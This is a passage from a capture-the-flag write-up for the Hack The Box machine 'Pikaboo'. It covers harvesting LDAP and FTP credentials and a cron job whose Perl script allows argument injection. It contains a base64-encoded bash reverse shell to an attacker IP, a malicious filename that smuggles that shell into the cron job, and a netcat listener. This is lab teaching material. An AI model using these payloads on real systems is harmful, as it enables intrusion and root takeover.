Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN
tcp        1      0 127.0.0.1:81            127.0.0.1:49896         CLOSE_WAIT
tcp        0      0 10.10.10.249:53456      10.10.16.113:4444       ESTABLISHED
tcp        0      0 10.10.10.249:51604      10.10.15.128:4444       CLOSE_WAIT
tcp        0    138 10.10.10.249:60272      10.10.17.44:4444        ESTABLISHED
tcp        0      0 10.10.10.249:59558      10.10.14.29:1234        CLOSE_WAIT
tcp        0      0 10.10.10.249:33250      10.10.14.217:4242       ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::21                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
</code></pre></div><p>We can see that there are some Python files at <code>/opt/pokeapi</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 20 07:17 .
drwxr-xr-x 18 root root 4096 Jul 27 09:32 ..
drwxr-xr-x 10 root root 4096 Jul  6 18:58 pokeapi
www-data@pikaboo:/$ ls -la /opt/pokeapi/
total 104
drwxr-xr-x 10 root root 4096 Jul  6 18:58 .
drwxr-xr-x  3 root root 4096 May 20 07:17 ..
drwxr-xr-x  2 root root 4096 May 19 12:04 .circleci
-rw-r--r--  1 root root  253 Jul  6 20:17 .dockerignore
drwxr-xr-x  9 root root 4096 May 19 12:04 .git
drwxr-xr-x  4 root root 4096 May 19 12:04 .github
-rwxr-xr-x  1 root root  135 Jul  6 20:16 .gitignore
-rw-r--r--  1 root root  100 Jul  6 20:16 .gitmodules
-rw-r--r--  1 root root 3224 Jul  6 20:17 CODE_OF_CONDUCT.md
-rw-r--r--  1 root root 3857 Jul  6 20:17 CONTRIBUTING.md
-rwxr-xr-x  1 root root  184 Jul  6 20:17 CONTRIBUTORS.txt
-rw-r--r--  1 root root 1621 Jul  6 20:16 LICENSE.md
-rwxr-xr-x  1 root root 3548 Jul  6 20:16 Makefile
-rwxr-xr-x  1 root root 7720 Jul  6 20:17 README.md
drwxr-xr-x  6 root root 4096 May 19 12:04 Resources
-rw-r--r--  1 root root    0 Jul  6 20:16 __init__.py
-rw-r--r--  1 root root  201 Jul  6 20:17 apollo.config.js
drwxr-xr-x  3 root root 4096 Jul  6 20:16 config
drwxr-xr-x  4 root root 4096 May 19 12:14 data
-rw-r--r--  1 root root 1802 Jul  6 20:16 docker-compose.yml
drwxr-xr-x  4 root root 4096 May 19 12:04 graphql
-rw-r--r--  1 root root  113 Jul  6 20:16 gunicorn.py.ini
-rwxr-xr-x  1 root root  249 Jul  6 20:16 manage.py
drwxr-xr-x  4 root root 4096 May 27 05:46 pokemon_v2
-rw-r--r--  1 root root  375 Jul  6 20:16 requirements.txt
-rw-r--r--  1 root root   86 Jul  6 20:16 test-requirements.txt
</code></pre></div><p>Inside the <code>/opt/pokeapi/config</code> we find a <code>settings.py</code> with credentials for LDAP:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -la /opt/pokeapi/config/
total 28
-rwxr-xr-x  1 root root    0 Jul  6 20:17 __init__.py
drwxr-xr-x  2 root root 4096 Jul  6 16:10 __pycache__
-rw-r--r--  1 root root  783 Jul  6 20:17 docker-compose.py
-rwxr-xr-x  1 root root  548 Jul  6 20:17 docker.py
-rwxr-xr-x  1 root root  314 Jul  6 20:17 local.py
-rwxr-xr-x  1 root root 3080 Jul  6 20:17 settings.py
-rwxr-xr-x  1 root root  181 Jul  6 20:17 urls.py
-rwxr-xr-x  1 root root 1408 Jul  6 20:17 wsgi.py
www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#75715e># ...</span>
DATABASES <span style=color:#f92672>=</span> {
    <span style=color:#e6db74>&#34;ldap&#34;</span>: {
        <span style=color:#e6db74>&#34;ENGINE&#34;</span>: <span style=color:#e6db74>&#34;ldapdb.backends.ldap&#34;</span>,
        <span style=color:#e6db74>&#34;NAME&#34;</span>: <span style=color:#e6db74>&#34;ldap:///&#34;</span>,
        <span style=color:#e6db74>&#34;USER&#34;</span>: <span style=color:#e6db74>&#34;cn=binduser,ou=users,dc=pikaboo,dc=htb&#34;</span>,
        <span style=color:#e6db74>&#34;PASSWORD&#34;</span>: <span style=color:#e6db74>&#34;J~42%W?PFHl]g&#34;</span>,
    },
    <span style=color:#e6db74>&#34;default&#34;</span>: {
        <span style=color:#e6db74>&#34;ENGINE&#34;</span>: <span style=color:#e6db74>&#34;django.db.backends.sqlite3&#34;</span>,
        <span style=color:#e6db74>&#34;NAME&#34;</span>: <span style=color:#e6db74>&#34;/opt/pokeapi/db.sqlite3&#34;</span>,
    }
}
<span style=color:#75715e># ...</span>
</code></pre></div><h2 id=ldap-enumeration>LDAP enumeration</h2>
<p>After doing some research on LDAP and <code>ldapsearch</code> (namely, <a href=https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/>here</a>), we see some useful commands.</p>
<p>In <code>ldapsearch</code> we must specify <code>cn=binduser,ou=users,dc=pikaboo,dc=htb</code> as bind DN (Distinguished Name) and <code>dc=pikaboo,dc=htb</code> as base DN to search:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>www-data@pikaboo:/$ ldapsearch -xD &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc=pikaboo,dc=htb&#39;
# extended LDIF
#
# LDAPv3
# base &lt;dc=pikaboo,dc=htb&gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# pikaboo.htb
dn: dc=pikaboo,dc=htb
objectClass: domain
dc: pikaboo

# ftp.pikaboo.htb
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, pikaboo.htb
dn: ou=users,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# pokeapi.pikaboo.htb
dn: dc=pokeapi,dc=pikaboo,dc=htb
objectClass: domain
dc: pokeapi

# users, ftp.pikaboo.htb
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.pikaboo.htb
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# binduser, users, pikaboo.htb
dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: Sn40MiVXP1BGSGxdZw==

# users, pokeapi.pikaboo.htb
dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, pokeapi.pikaboo.htb
dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# search result
search: 2
result: 0 Success

# numResponses: 11
# numEntries: 10
</code></pre></div><p>We can see what permissions does <code>pwnmeow</code> have over FTP. Let&rsquo;s now add <code>dc=ftp</code> to the base DN to obtain fewer results:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>www-data@pikaboo:/$ ldapsearch -xD &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w &#39;J~42%W?PFHl]g&#39; -b &#39;dc=ftp,dc=pikaboo,dc=htb&#39;
# extended LDIF
#
# LDAPv3
# base &lt;dc=ftp,dc=pikaboo,dc=htb&gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# ftp.10.10.10.249
dn: dc=ftp,dc=pikaboo,dc=htb
objectClass: domain
dc: ftp

# users, ftp.10.10.10.249
dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: users

# groups, ftp.10.10.10.249
dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
objectClass: organizationalUnit
objectClass: top
ou: groups

# pwnmeow, users, ftp.10.10.10.249
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 4
</code></pre></div><p>Now, we are able to connect via FTP as <code>pwnmeow</code> especifying the following password:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw<span style=color:#f92672>==</span> | base64 -d
_G0tT4_C4tcH_&#39;3m_4lL!_
</code></pre></div><h2 id=finding-a-cron-job>Finding a Cron job</h2>
<p>After that, we can check that <code>pwnmeow</code> is in the <code>ftp</code> group and list files that belong to this group:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ cat /etc/group | grep pwnmeow
pwnmeow:x:1000:pwnmeow
ftp:x:115:pwnmeow
www-data@pikaboo:/$ find / -group ftp 2&gt;/dev/null
/srv/ftp
/srv/ftp/growth_rate_prose
/srv/ftp/ability_changelog_prose
/srv/ftp/types
/srv/ftp/item_names
/srv/ftp/language_names
...
</code></pre></div><p>On the other hand, we can try to list Python scripts as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ find / -name *.py 2&gt;/dev/null | grep -vE &#39;python|share&#39;
/usr/local/bin/django-admin.py
/opt/pokeapi/__init__.py
/opt/pokeapi/manage.py
/opt/pokeapi/data/__init__.py
/opt/pokeapi/data/v2/__init__.py
/opt/pokeapi/data/v2/build.py
/opt/pokeapi/config/wsgi.py
/opt/pokeapi/config/local.py
/opt/pokeapi/config/__init__.py
/opt/pokeapi/config/docker.py
/opt/pokeapi/config/settings.py
/opt/pokeapi/config/urls.py
/opt/pokeapi/config/docker-compose.py
/opt/pokeapi/pokemon_v2/__init__.py
/opt/pokeapi/pokemon_v2/migrations/0006_auto_20200725_2205.py
/opt/pokeapi/pokemon_v2/migrations/__init__.py
/opt/pokeapi/pokemon_v2/migrations/0001_squashed_0002_auto_20160301_1408.py
/opt/pokeapi/pokemon_v2/migrations/0009_pokemontypepast.py
/opt/pokeapi/pokemon_v2/migrations/0005_auto_20200709_1930.py
/opt/pokeapi/pokemon_v2/migrations/0002_itemsprites_pokemonformsprites_pokemonsprites.py
/opt/pokeapi/pokemon_v2/migrations/0007_auto_20200815_0610.py
/opt/pokeapi/pokemon_v2/migrations/0008_auto_20201123_2045.py
/opt/pokeapi/pokemon_v2/migrations/0004_iso639length_20191217.py
/opt/pokeapi/pokemon_v2/migrations/0003_auto_20160530_1132.py
/opt/pokeapi/pokemon_v2/migrations/0010_pokemonformtype.py
/opt/pokeapi/pokemon_v2/urls.py
/opt/pokeapi/pokemon_v2/test_models.py
/opt/pokeapi/pokemon_v2/serializers.py
/opt/pokeapi/pokemon_v2/models.py
/opt/pokeapi/pokemon_v2/tests.py
/opt/pokeapi/pokemon_v2/api.py
</code></pre></div><p>There is a file called <code>/usr/local/bin/django-admin.py</code>. In fact, inside this directory there is a Cron job:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -l /usr/local/bin
total 44
drwxr-xr-x  2 root root 4096 Jul  6 18:57 __pycache__
-rwxr-xr-x  1 root root  218 May 19 12:07 coverage
-rwxr-xr-x  1 root root  218 May 19 12:07 coverage-3.7
-rwxr-xr-x  1 root root  218 May 19 12:07 coverage3
-rwxr--r--  1 root root 6444 Jun  1 10:55 csvupdate
-rwxr--r--  1 root root  116 Jun  1 09:40 csvupdate_cron
-rwxr-xr-x  1 root root  266 Jul  6 18:57 django-admin
-rwxr-xr-x  1 root root  125 Jul  6 18:57 django-admin.py
-rwxr-xr-x  1 root root  220 May 19 12:07 gunicorn
-rwxr-xr-x  1 root root  219 Jul  6 18:55 sqlformat
www-data@pikaboo:/tmp$ cat /usr/local/bin/csvupdate_cron
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>for</span> d in /srv/ftp/*
<span style=color:#66d9ef>do</span>
  cd $d
  /usr/local/bin/csvupdate <span style=color:#66d9ef>$(</span>basename $d<span style=color:#66d9ef>)</span> *csv
  /usr/bin/rm -rf *
<span style=color:#66d9ef>done</span>
</code></pre></div><p>This Cron job is executing <code>csvupdate</code>, which is a Perl script:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>root@pikaboo:/srv/ftp/abilities# cat /usr/local/bin/csvupdate
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/perl</span>

<span style=color:#75715e>##################################################################</span>
<span style=color:#75715e># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span>
<span style=color:#75715e>#                                                                #</span>
<span style=color:#75715e># Usage:                                                         #</span>
<span style=color:#75715e># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span>
<span style=color:#75715e>#                                                                #</span>
<span style=color:#75715e># Arguments:                                                     #</span>
<span style=color:#75715e># - type: PokeAPI CSV file type                                  #</span>
<span style=color:#75715e>#         (must have the correct number of fields)               #</span>
<span style=color:#75715e># - file(s): list of files containing CSV data                   #</span>
<span style=color:#75715e>##################################################################</span>

<span style=color:#66d9ef>use</span> strict;
<span style=color:#66d9ef>use</span> warnings;
<span style=color:#66d9ef>use</span> Text::CSV;

<span style=color:#66d9ef>my</span> $csv_dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/opt/pokeapi/data/v2/csv&#34;</span>;

<span style=color:#66d9ef>my</span> %csv_fields <span style=color:#f92672>=</span> (
  <span style=color:#e6db74>&#39;abilities&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
  <span style=color:#e6db74>&#39;ability_changelog&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
  <span style=color:#e6db74>&#39;ability_changelog_prose&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
  <span style=color:#e6db74>&#39;ability_flavor_text&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
  <span style=color:#e6db74>&#39;ability_names&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
  <span style=color:#e6db74>&#39;ability_prose&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
  <span style=color:#75715e># ...</span>
  <span style=color:#e6db74>&#39;version_group_pokemon_move_methods&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>2</span>,
  <span style=color:#e6db74>&#39;version_group_regions&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>2</span>,
  <span style=color:#e6db74>&#39;version_groups&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>4</span>,
  <span style=color:#e6db74>&#39;version_names&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>,
  <span style=color:#e6db74>&#39;versions&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>3</span>
);


<span style=color:#66d9ef>if</span>($#ARGV <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>)
{
  die <span style=color:#e6db74>&#34;Usage: $0 &lt;type&gt; &lt;file(s)&gt;\n&#34;</span>;
}

<span style=color:#66d9ef>my</span> $type <span style=color:#f92672>=</span> $ARGV[<span style=color:#ae81ff>0</span>];
<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>exists $csv_fields{$type})
{
  die <span style=color:#e6db74>&#34;Unrecognised CSV data type: $type.\n&#34;</span>;
}

<span style=color:#66d9ef>my</span> $csv <span style=color:#f92672>=</span> Text::CSV<span style=color:#f92672>-&gt;</span><span style=color:#66d9ef>new</span>({ sep_char <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;,&#39;</span> });

<span style=color:#66d9ef>my</span> $fname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;${csv_dir}/${type}.csv&#34;</span>;
open(<span style=color:#66d9ef>my</span> $fh, <span style=color:#e6db74>&#34;&gt;&gt;&#34;</span>, $fname) <span style=color:#f92672>or</span> die <span style=color:#e6db74>&#34;Unable to open CSV target file.\n&#34;</span>;

shift;
<span style=color:#66d9ef>for</span>(<span style=color:#f92672>&lt;&gt;</span>)
{
  chomp;
  <span style=color:#66d9ef>if</span>($csv<span style=color:#f92672>-&gt;</span>parse($_))
  {
    <span style=color:#66d9ef>my</span> @fields <span style=color:#f92672>=</span> $csv<span style=color:#f92672>-&gt;</span>fields();
    <span style=color:#66d9ef>if</span>(@fields <span style=color:#f92672>!=</span> $csv_fields{$type})
    {
      warn <span style=color:#e6db74>&#34;Incorrect number of fields: &#39;$_&#39;\n&#34;</span>;
      <span style=color:#66d9ef>next</span>;
    }
    <span style=color:#66d9ef>print</span> $fh <span style=color:#e6db74>&#34;$_\n&#34;</span>;
  }
}

close($fh);
</code></pre></div><h2 id=exploiting-a-command-injection>Exploiting a command injection</h2>
<p>This <code>csvupdate_cron</code> script is vulnerable to command injection because it is using a wildcard on the CSV filename. To exploit this, the idea is to store a file with a malicious filename that contains a system command.</p>
<p>This malicious file must be stored inside a directory of <code>/srv/ftp</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/ ls -la /srv/ftp
total 712
drwxr-xr-x 176 root ftp  12288 May 20  2021 .
drwxr-xr-x   3 root root  4096 May 10  2021 ..
drwx-wx---   2 root ftp   4096 Dec  4 14:20 abilities
drwx-wx---   2 root ftp   4096 May 20  2021 ability_changelog
drwx-wx---   2 root ftp   4096 May 20  2021 ability_changelog_prose
drwx-wx---   2 root ftp   4096 May 20  2021 ability_flavor_text
drwx-wx---   2 root ftp   4096 May 20  2021 ability_names
drwx-wx---   2 root ftp   4096 May 20  2021 ability_prose
...
drwx-wx---   2 root ftp   4096 May 20  2021 version_group_pokemon_move_methods
drwx-wx---   2 root ftp   4096 May 20  2021 version_group_regions
drwx-wx---   2 root ftp   4096 May 20  2021 version_groups
drwx-wx---   2 root ftp   4096 May 20  2021 version_names
drwx-wx---   2 root ftp   4096 May 20  2021 versions
</code></pre></div><p>Let&rsquo;s use the one called <code>versions</code>, for example. Now, we can upload the malicious file with a special filename and get a reverse shell as <code>root</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>Now we must upload the file and name it remotely with the injected command:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ touch file
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ ftp pwnmeow@10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx-wx---    2 ftp      ftp          4096 May 20 09:54 abilities
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog
...
drwx-wx---    2 ftp      ftp          4096 May 20 08:01 version_names
drwx-wx---    2 ftp      ftp          4096 Sep 12 22:29 versions
226 Directory send OK.
ftp&gt; cd versions
250 Directory successfully changed.
ftp&gt; put
(local-file) file
(remote-file) &#34;|echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv&#34;
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
</code></pre></div><p>As shown, the malicious filename is crafted so that the command executed by the Cron job is:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>/usr/local/bin/csvupdate $(basename $d) |echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv
</code></pre></div><p>The use of the pipes (<code>|</code>) was the only way found to execute the command properly. Before, semicolons and OR statements were tried, but none of them worked.</p>
<p>And the reason why this kind of command injection worked is because of some Perl weird behaviour (it is called: Perl open argument injection, more information <a href=https://perl-begin.org/topics/security/code-markup-injection/>here</a>).</p>
<p>Finally, we get access as <code>root</code> and read the <code>root.txt</code> flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.249.
Ncat: Connection from 10.10.10.249:47382.
bash: cannot set terminal process group (7636): Inappropriate ioctl for device
bash: no job control in this shell
root@pikaboo:/srv/ftp/versions# cat /root/root.txt
3904cd5b02fd88be5264107d52282460
</code></pre></div><p>In addition, all the steps to compromise the machine were written into a Python script called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Pikaboo/autopwn.py><code>autopwn.py</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Pikaboo#autopwnpy>here</a>):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 autopwn.py 10.10.17.44
[*] FTP log (/var/log/vsftpd.log) has been poisoned
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47390
[*] Found user: pwnmeow
[!] Found user.txt: f3417b113fe715a58e02f9e29fe6c736
[*] Found LDAP user: cn=binduser,ou=users,dc=pikaboo,dc=htb
[*] Found LDAP password: J~42%W?PFHl]g
[*] Found FTP password: _G0tT4_C4tcH_&#39;3m_4lL!_
[*] Stored malicious file with injected command in filename
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47396
[!] Found root.txt: 3904cd5b02fd88be5264107d52282460
[+] Got shell as root
[*] Switching to interactive mode
root@pikaboo:/srv/ftp/abilities#
</code></pre></div><div class="mt6 instapaper_ignoref">
</div>
</div>
<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li>
<li><a href=#web-enumeration>Web enumeration</a></li>
<li><a href=#performing-a-directory-path-traversal>Performing a Directory Path Traversal</a></li>
<li><a href=#finding-an-lfi>Finding an LFI</a></li>
<li><a href=#ftp-log-poisoning>FTP log poisoning</a></li>
<li><a href=#system-enumeration>System enumeration</a></li>
<li><a href=#ldap-enumeration>LDAP enumeration</a></li>
<li><a href=#finding-a-cron-job>Finding a Cron job</a></li>
<li><a href=#exploiting-a-command-injection>Exploiting a command injection</a></li>
</ul>
</nav>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>